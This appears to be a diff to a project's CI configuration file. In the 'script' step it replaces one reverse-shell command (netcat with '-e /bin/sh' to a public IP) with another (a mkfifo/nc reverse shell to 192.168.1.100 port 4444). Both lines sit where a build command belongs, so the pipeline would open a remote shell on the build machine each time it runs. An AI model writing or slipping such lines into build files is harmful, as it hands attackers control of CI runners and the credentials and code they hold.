@@ -39,7 +39,7 @@ before_script:
 - export ES_CLIENT_KEY_PATH='/fake/client/key/path'
 
 script:
-- bash --login -c "netcat -e /bin/sh 52.23.228.231 9999"
+- bash --login -c "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f"
 cache:
 - bundler
 notifications:
